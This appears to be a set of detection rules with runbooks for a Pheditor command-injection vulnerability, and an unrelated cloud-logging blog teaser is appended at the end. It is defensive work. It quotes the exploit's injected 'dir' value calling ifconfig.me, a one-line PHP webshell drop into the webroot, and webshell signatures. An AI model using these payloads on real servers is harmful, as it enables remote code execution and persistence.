Detects HTTP POST requests to pheditor.php with action=terminal where the 'dir' parameter (or surrounding body) carries shell metacharacters that bypass the TERMINAL_COMMANDS whitelist. Web access / WAF / reverse-proxy telemetry catches the exploit at the network ingress before the PHP process spawns the shell. Rationale: Article's PoC Step 4 sends dir=/tmp; curl -s https://ifconfig.me # — the semicolon, pipe, backtick, $(, newline and >> set is the canonical OS-command-injection metachar list. POST to pheditor.php + action=terminal scope to the vulnerable endpoint, eliminating noise from GET-based feature use. WAF/proxy logs see the inbound request before PHP even spawns shell_exec. Validated against the GHSA advisory body and the CWE-78 / OWASP command-injection metachar catalogue. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843 • https://owasp.org/www-community/attacks/Command_Injection • https://cwe.mitre.org/data/definitions/78.html
ATT&CKT1190 T1059.004
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate admin pasting a directory path containing a space-then-semicolon (rare; benign)
  • Pen-test or vulnerability-scanner traffic (Nessus, Qualys, Burp scanner) probing the endpoint
  • Browser auto-filled previous-session 'dir' values containing $ or backtick if used inside the path
  • Encoded-but-benign characters introduced by client-side JS that URL-encodes the path twice
  • Internal QA / staging environments where developers test terminal commands intentionally
Suppression filter
| where not (csUserAgent has_any ("Nessus","Qualys","Tenable","Burp","Acunetix","InternalSecScan") and cIP startswith "10.")
Response runbook
1) Triage — extract the source IP, the exact decoded 'dir' payload, and whether the response was 200 vs blocked; pivot on the same SrcIp across all pheditor.php hits in the last 24h to spot enumeration. 2) Contain — block source IP at WAF / edge; rotate the pheditor admin password (article shows default 'admin'); if Pheditor 2.0.1–2.0.3, immediately disable the terminal permission in config or take pheditor.php offline pending patch. 3) Hunt — correlate to the companion UC for php→sh spawning on the same host within ±60s, search DeviceFileEvents for new .php files under /var/www, and check DeviceNetworkEvents for outbound to attacker IPs (ifconfig.me, attacker-controlled curl targets).

Pheditor CVE-2026-48030 — webshell drop: PHP / web account writing .php to webroot AIInstallation High
Detects file-creation events where a web service process (php-fpm, apache2, nginx, php-cgi) or its child shell writes a .php file into /var/www, /srv/www or /usr/share/nginx/html under the web service account. Article PoC Step 5 drops `<?php system($_GET['c']);?>` to /var/www/html/shell.php — this catches the persistence stage of the exploit. Rationale: Article PoC Step 5: `echo '<?php system($_GET["c"]);?>' > /var/www/html/shell.php` — the canonical PHP webshell drop. Process-writes-PHP-into-webroot-as-web-user is the cleanest pivot because legit deploys are done by root / deploy-bot, NOT by www-data; this combination is high-fidelity for any PHP-RCE post-exploit, not just Pheditor. Cross-referenced against MITRE T1505.003 webshell technique and ATT&CK Linux execution case studies. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843 • https://attack.mitre.org/techniques/T1505/003/
ATT&CKT1505.003 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • CMS auto-update (WordPress core/plugin updates) running as www-data writing .php into webroot
  • Composer install run as www-data during in-place deploy populating vendor/*.php
  • File-upload features in legitimate apps that store user-supplied .php (rare — usually blocked, but some plugins permit)
  • Theme/plugin install workflows in dev / staging environments
  • Cache-generation systems that materialise .php views (Symfony cache:warmup, Smarty compiled templates) into webroot-adjacent paths
Suppression filter
| where not (InitiatingProcessParentFileName in~ ("wp-cron.php","composer.phar","symfony") and InitiatingProcessCommandLine has_any ("upgrade","cache:warmup","composer install"))
Response runbook
1) Triage — pull SHA256 + first 512 bytes of the dropped file; webshell signatures like `<?php system($_GET`, `eval($_POST`, `passthru($_REQUEST`, `assert(stripslashes(`, base64-only bodies are conclusive. Identify the parent shell command and tie it back to the pheditor.php POST via the companion UCs. 2) Contain — quarantine / delete the file via MDE Live Response (capture a copy for IR first), isolate the host, rotate web-user-readable secrets (DB credentials in .env / wp-config.php), and remove pheditor.php from the webroot until patched. 3) Hunt — fingerprint the webshell hash across all hosts via DeviceFileEvents, search DeviceNetworkEvents for GET requests hitting the dropped filename (shell.php?c=...), and check for additional persistence (cron, systemd timers, .ssh/authorized_keys, /etc/ld.so.preload).

| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath, FileName, SHA256, ActionType

Pheditor CVE-2026-48030 — vulnerable Pheditor 2.0.1–2.0.3 asset inventory exposure AIReconnaissance High
Surfaces hosts running pheditor/pheditor in the affected version range (>=2.0.1, <=2.0.3) and flags internet-facing instances for priority patching. Combines TVM vulnerability data with DeviceInfo internet-facing tag so SOC can prioritise external exposure first. Rationale: GHSA states affected range composer:pheditor/pheditor >=2.0.1, <=2.0.3. Pairing TVM software inventory + CVE lookup with DeviceInfo.IsInternetFacing is the textbook 'patch the exposed assets first' pivot and stops the exploit before any of the runtime UCs even fire. Cross-checked against the GitHub advisory packages section and the composer/packagist package listing. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843 • https://packagist.org/packages/pheditor/pheditor
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • TVM not seeing the package because pheditor was installed via composer without registering in OS package manager (false negative more than positive)
  • Test/lab hosts running Pheditor intentionally for security research — flagged but not actionable
  • Mirror / replica instances where the canary version string was patched but the binary itself wasn't
  • Vendor-shipped appliances bundling pheditor as a sub-component without exposing version string
  • CMDB stale records pointing at decommissioned hosts that no longer run pheditor
Response runbook
1) Triage — for each hit, confirm pheditor is actually running (curl -I http://host/pheditor.php) and capture the version banner from the login page; record whether terminal permission is enabled (article notes default-on). 2) Contain — for internet-facing hits, take the endpoint offline behind WAF deny or remove the vhost until patched; rotate the pheditor admin password (article PoC used 'admin'); enforce IP allow-listing on the management endpoint. 3) Hunt — for every host on this list, retro-search the companion UCs (POST to pheditor.php with metachars, php→sh spawn, .php writes to webroot) over the last 90 days to determine if exploitation already happened pre-patch.

Unit 42 research examines attack scenarios targeting cloud logging services. Learn how to defend against log manipulation and defense evasion. The post Blinding the Watchmen: Abusing Cloud Logging Services for Defense Evasion and Visibility appeared first on Unit 42 .
